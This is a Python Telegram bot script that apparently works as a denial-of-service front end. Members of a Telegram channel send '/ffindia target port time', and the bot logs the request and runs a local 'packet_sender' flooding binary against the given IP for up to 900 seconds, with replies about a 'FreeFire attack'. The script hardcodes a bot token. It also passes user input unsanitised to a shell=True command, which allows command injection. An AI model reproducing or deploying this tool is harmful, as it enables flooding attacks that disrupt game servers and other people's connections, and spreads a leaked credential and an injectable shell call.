#!/usr/bin/python3

import telebot
import subprocess
import requests
import datetime
import os

# Insert your Telegram bot token here
bot = telebot.TeleBot('7555646444:AAHBoszyfH6tINTB8T65e3KvRlmJu47MnLk')

# Admin user IDs
admin_id = ["7530806675"]

# File to store command logs
LOG_FILE = "log.txt"

# Replace with your channel username
CHANNEL_ID = "@rajcracks"

# Function to log commands
def log_command(user_id, target, port, time):
    user_info = bot.get_chat(user_id)
    if user_info.username:
        username = "@" + user_info.username
    else:
        username = f"UserID: {user_id}"
    
    with open(LOG_FILE, "a") as file:  # Open in "append" mode
        file.write(f"Username: {username}\nTarget: {target}\nPort: {port}\nTime: {time}\n\n")

# Function to verify if a user is a member of the channel
def is_channel_member(user_id):
    try:
        member_status = bot.get_chat_member(CHANNEL_ID, user_id).status
        return member_status in ['member', 'administrator', 'creator']
    except telebot.apihelper.ApiException:
        return False

@bot.message_handler(commands=['start'])
def welcome_start(message):
    user_name = message.from_user.first_name
    response = f'''⠛⠛⣿⣿⣿⣿⣿⡷⢶⣦⣶⣶⣤⣤⣤⣀⠀⠀⠀
⠀⠀⠀⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⡀⠀
⠀⠀⠀⠉⠉⠉⠙⠻⣿⣿⠿⠿⠛⠛⠛⠻⣿⣿⣇⠀
⠀⠀⢤⣀⣀⣀⠀⠀⢸⣷⡄⠀⣁⣀⣤⣴⣿⣿⣿⣆
⠀⠀⠀⠀⠹⠏⠀⠀⠀⣿⣧⠀⠹⣿⣿⣿⣿⣿⡿⣿
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠛⠿⠇⢀⣼⣿⣿⠛⢯⡿⡟
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠦⠴⢿⢿⣿⡿⠷⠀⣿⠀
⠀⠀⠀⠀⠀⠀⠀⠙⣷⣶⣶⣤⣤⣤⣤⣤⣶⣦⠃⠀
⠀⠀⠀⠀⠀⠀⠀⢐⣿⣾⣿⣿⣿⣿⣿⣿⣿⣿⠀⠀FREEFIRE
⠀⠀⠀⠀⠀⠀⠀⠈⣿⣿⣿⣿⣿⣿⣿⣿⣿⡇⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⠻⢿⣿⣿⣿⣿⠟⠁

🤖Try To Run This Command : /help 
✅Join :- https://t.me/rajcracks
🌟Contact Owner :- @raj_magic'''
    bot.reply_to(message, response)
    
@bot.message_handler(commands=['ffindia'])
def handle_ffindia(message):
    user_id = str(message.chat.id)
    response = None  # Initialize the response variable
    
    if is_channel_member(user_id):
        command = message.text.split()
        if len(command) == 4:
            target = command[1]
            port = int(command[2])
            time = int(command[3])
            if time > 900:
                response = "❌ Error: Time interval must be less than or equal to 900 seconds."
            else:
                log_command(user_id, target, port, time)
                full_command = f"./packet_sender {target} {port} {time}"
                
                # Updated reply format for successful attack start
                bot.reply_to(message, f"✅ FreeFire attack Started Now ping 🛜999+\nTarget: {target}\nPort: {port}\nTime: {time} seconds\nCredit: @raj_magic")
                
                # Run the attack command
                subprocess.run(full_command, shell=True)
                
                # Send a finished message after execution
                bot.reply_to(message, "✅ Attack finished successfully.")
        else:
            response = "🌟 Usage: /ffindia <target> <port> <time>"
    else:
        # Dynamic channel link in error message
        response = f"❌ You must join the channel {CHANNEL_ID} to use this command."
    
    # Send response if it exists
    if response:
        bot.reply_to(message, response)

# Command to show the user's Telegram ID
@bot.message_handler(commands=['id'])
def show_user_id(message):
    user_id = str(message.chat.id)
    bot.reply_to(message, f"Your Telegram ID is: {user_id}")

# Command to show help
@bot.message_handler(commands=['help'])
def show_help(message):
    help_text = '''🤖 Available commands:
💥 /ffindia: Start an attack To Get 999+
💥 /id: Get your Telegram ID.
💥 /rules: To Get Rules
💥 /help: Show this help message.

Join our channel: https://t.me/rajcracks
Contact admin: @raj_magic
'''
    bot.reply_to(message, help_text)

# Command to show rules
@bot.message_handler(commands=['rules'])
def show_rules(message):
    response = '''⚠️ Please follow these rules:
1. Do not run multiple attacks simultaneously.
2. Respect the cooldown period between commands.
3.Please use Main ID because First TG HACK
4. Follow the channel for updates @rajcracks.
'''
    bot.reply_to(message, response)

# Polling for updates
bot.polling()
